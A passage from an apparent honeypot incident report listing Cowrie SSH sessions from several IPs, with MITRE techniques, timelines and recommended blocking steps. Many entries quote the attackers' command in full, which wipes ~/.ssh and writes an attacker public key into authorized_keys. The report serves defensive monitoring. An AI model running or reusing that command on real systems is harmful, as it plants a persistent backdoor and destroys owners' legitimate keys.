| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:19:06` | `cowrie.session.connect` |
| `2026-04-20 21:19:06` | `cowrie.client.version` |
| `2026-04-20 21:19:06` | `cowrie.client.kex` |
| `2026-04-20 21:19:07` | `cowrie.login.success` |
| `2026-04-20 21:19:07` | `cowrie.session.params` |
| `2026-04-20 21:19:07` | `cowrie.command.input` |
| `2026-04-20 21:19:07` | `cowrie.command.failed` |
| `2026-04-20 21:19:07` | `cowrie.log.closed` |
| `2026-04-20 21:19:08` | `cowrie.session.params` |
| `2026-04-20 21:19:08` | `cowrie.command.input` |
| `2026-04-20 21:19:08` | `cowrie.session.file_download` |
| `2026-04-20 21:19:08` | `cowrie.log.closed` |
| `2026-04-20 21:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10000c5f4f4b

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:19 |
| **Last Seen** | 2026-04-20 21:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:19:10` | `cowrie.session.connect` |
| `2026-04-20 21:19:10` | `cowrie.client.version` |
| `2026-04-20 21:19:10` | `cowrie.client.kex` |
| `2026-04-20 21:19:11` | `cowrie.login.success` |
| `2026-04-20 21:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e2e920b650f

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:20 |
| **Last Seen** | 2026-04-20 21:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:20:25` | `cowrie.session.connect` |
| `2026-04-20 21:20:25` | `cowrie.client.version` |
| `2026-04-20 21:20:25` | `cowrie.client.kex` |
| `2026-04-20 21:20:26` | `cowrie.login.success` |
| `2026-04-20 21:20:26` | `cowrie.session.params` |
| `2026-04-20 21:20:26` | `cowrie.command.input` |
| `2026-04-20 21:20:26` | `cowrie.command.failed` |
| `2026-04-20 21:20:26` | `cowrie.log.closed` |
| `2026-04-20 21:20:27` | `cowrie.session.params` |
| `2026-04-20 21:20:27` | `cowrie.command.input` |
| `2026-04-20 21:20:27` | `cowrie.session.file_download` |
| `2026-04-20 21:20:27` | `cowrie.log.closed` |
| `2026-04-20 21:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5994070025

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:20 |
| **Last Seen** | 2026-04-20 21:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:20:29` | `cowrie.session.connect` |
| `2026-04-20 21:20:29` | `cowrie.client.version` |
| `2026-04-20 21:20:30` | `cowrie.client.kex` |
| `2026-04-20 21:20:30` | `cowrie.login.success` |
| `2026-04-20 21:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86cdf3378d3a

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:20 |
| **Last Seen** | 2026-04-20 21:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:20:49` | `cowrie.session.connect` |
| `2026-04-20 21:20:49` | `cowrie.client.version` |
| `2026-04-20 21:20:49` | `cowrie.client.kex` |
| `2026-04-20 21:20:49` | `cowrie.login.success` |
| `2026-04-20 21:20:50` | `cowrie.session.params` |
| `2026-04-20 21:20:50` | `cowrie.command.input` |
| `2026-04-20 21:20:50` | `cowrie.command.failed` |
| `2026-04-20 21:20:50` | `cowrie.log.closed` |
| `2026-04-20 21:20:50` | `cowrie.session.params` |
| `2026-04-20 21:20:50` | `cowrie.command.input` |
| `2026-04-20 21:20:51` | `cowrie.session.file_download` |
| `2026-04-20 21:20:51` | `cowrie.log.closed` |
| `2026-04-20 21:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7139355da9e0

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:20 |
| **Last Seen** | 2026-04-20 21:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:20:53` | `cowrie.session.connect` |
| `2026-04-20 21:20:53` | `cowrie.client.version` |
| `2026-04-20 21:20:53` | `cowrie.client.kex` |
| `2026-04-20 21:20:53` | `cowrie.login.success` |
| `2026-04-20 21:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cd03fd8c81d

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:21 |
| **Last Seen** | 2026-04-20 21:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:21:06` | `cowrie.session.connect` |
| `2026-04-20 21:21:06` | `cowrie.client.version` |
| `2026-04-20 21:21:06` | `cowrie.client.kex` |
| `2026-04-20 21:21:07` | `cowrie.login.success` |
| `2026-04-20 21:21:07` | `cowrie.session.params` |
| `2026-04-20 21:21:07` | `cowrie.command.input` |
| `2026-04-20 21:21:07` | `cowrie.command.failed` |
| `2026-04-20 21:21:08` | `cowrie.log.closed` |
| `2026-04-20 21:21:08` | `cowrie.session.params` |
| `2026-04-20 21:21:08` | `cowrie.command.input` |
| `2026-04-20 21:21:08` | `cowrie.session.file_download` |
| `2026-04-20 21:21:08` | `cowrie.log.closed` |
| `2026-04-20 21:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88eb4cca341f

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:21 |
| **Last Seen** | 2026-04-20 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:21:11` | `cowrie.session.connect` |
| `2026-04-20 21:21:11` | `cowrie.client.version` |
| `2026-04-20 21:21:12` | `cowrie.client.kex` |
| `2026-04-20 21:21:12` | `cowrie.login.success` |
| `2026-04-20 21:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eefc80e5032

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:22 |
| **Last Seen** | 2026-04-20 21:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:22:31` | `cowrie.session.connect` |
| `2026-04-20 21:22:31` | `cowrie.client.version` |
| `2026-04-20 21:22:31` | `cowrie.client.kex` |
| `2026-04-20 21:22:31` | `cowrie.login.success` |
| `2026-04-20 21:22:32` | `cowrie.session.params` |
| `2026-04-20 21:22:32` | `cowrie.command.input` |
| `2026-04-20 21:22:32` | `cowrie.command.failed` |
| `2026-04-20 21:22:32` | `cowrie.log.closed` |
| `2026-04-20 21:22:32` | `cowrie.session.params` |
| `2026-04-20 21:22:32` | `cowrie.command.input` |
| `2026-04-20 21:22:32` | `cowrie.session.file_download` |
| `2026-04-20 21:22:32` | `cowrie.log.closed` |
| `2026-04-20 21:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0227f5bd26a9

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:22 |
| **Last Seen** | 2026-04-20 21:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:22:34` | `cowrie.session.connect` |
| `2026-04-20 21:22:34` | `cowrie.client.version` |
| `2026-04-20 21:22:34` | `cowrie.client.kex` |
| `2026-04-20 21:22:35` | `cowrie.login.success` |
| `2026-04-20 21:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-215a3239fcef

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:25 |
| **Last Seen** | 2026-04-20 21:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:25:39` | `cowrie.session.connect` |
| `2026-04-20 21:25:39` | `cowrie.client.version` |
| `2026-04-20 21:25:39` | `cowrie.client.kex` |
| `2026-04-20 21:25:40` | `cowrie.login.success` |
| `2026-04-20 21:25:40` | `cowrie.session.params` |
| `2026-04-20 21:25:40` | `cowrie.command.input` |
| `2026-04-20 21:25:40` | `cowrie.command.failed` |
| `2026-04-20 21:25:40` | `cowrie.log.closed` |
| `2026-04-20 21:25:41` | `cowrie.session.params` |
| `2026-04-20 21:25:41` | `cowrie.command.input` |
| `2026-04-20 21:25:41` | `cowrie.session.file_download` |
| `2026-04-20 21:25:41` | `cowrie.log.closed` |
| `2026-04-20 21:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c461a9948b

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:25 |
| **Last Seen** | 2026-04-20 21:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:25:43` | `cowrie.session.connect` |
| `2026-04-20 21:25:43` | `cowrie.client.version` |
| `2026-04-20 21:25:44` | `cowrie.client.kex` |
| `2026-04-20 21:25:44` | `cowrie.login.success` |
| `2026-04-20 21:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d12b6bb11f

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:25 |
| **Last Seen** | 2026-04-20 21:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:25:54` | `cowrie.session.connect` |
| `2026-04-20 21:25:54` | `cowrie.client.version` |
| `2026-04-20 21:25:54` | `cowrie.client.kex` |
| `2026-04-20 21:25:55` | `cowrie.login.success` |
| `2026-04-20 21:25:55` | `cowrie.session.params` |
| `2026-04-20 21:25:55` | `cowrie.command.input` |
| `2026-04-20 21:25:55` | `cowrie.command.failed` |
| `2026-04-20 21:25:55` | `cowrie.log.closed` |
| `2026-04-20 21:25:55` | `cowrie.session.params` |
| `2026-04-20 21:25:55` | `cowrie.command.input` |
| `2026-04-20 21:25:55` | `cowrie.session.file_download` |
| `2026-04-20 21:25:55` | `cowrie.log.closed` |
| `2026-04-20 21:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8b2820ce11

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:25 |
| **Last Seen** | 2026-04-20 21:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:25:58` | `cowrie.session.connect` |
| `2026-04-20 21:25:58` | `cowrie.client.version` |
| `2026-04-20 21:25:58` | `cowrie.client.kex` |
| `2026-04-20 21:25:58` | `cowrie.login.success` |
| `2026-04-20 21:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23599e39357e

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:27 |
| **Last Seen** | 2026-04-20 21:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:27:22` | `cowrie.session.connect` |
| `2026-04-20 21:27:22` | `cowrie.client.version` |
| `2026-04-20 21:27:22` | `cowrie.client.kex` |
| `2026-04-20 21:27:23` | `cowrie.login.success` |
| `2026-04-20 21:27:23` | `cowrie.session.params` |
| `2026-04-20 21:27:23` | `cowrie.command.input` |
| `2026-04-20 21:27:23` | `cowrie.command.failed` |
| `2026-04-20 21:27:24` | `cowrie.log.closed` |
| `2026-04-20 21:27:24` | `cowrie.session.params` |
| `2026-04-20 21:27:24` | `cowrie.command.input` |
| `2026-04-20 21:27:24` | `cowrie.session.file_download` |
| `2026-04-20 21:27:24` | `cowrie.log.closed` |
| `2026-04-20 21:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be195fdee599

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:27 |
| **Last Seen** | 2026-04-20 21:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:27:27` | `cowrie.session.connect` |
| `2026-04-20 21:27:27` | `cowrie.client.version` |
| `2026-04-20 21:27:27` | `cowrie.client.kex` |
| `2026-04-20 21:27:28` | `cowrie.login.success` |
| `2026-04-20 21:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97dfb4103425

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:27 |
| **Last Seen** | 2026-04-20 21:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:27:34` | `cowrie.session.connect` |
| `2026-04-20 21:27:34` | `cowrie.client.version` |
| `2026-04-20 21:27:34` | `cowrie.client.kex` |
| `2026-04-20 21:27:35` | `cowrie.login.success` |
| `2026-04-20 21:27:35` | `cowrie.session.params` |
| `2026-04-20 21:27:35` | `cowrie.command.input` |
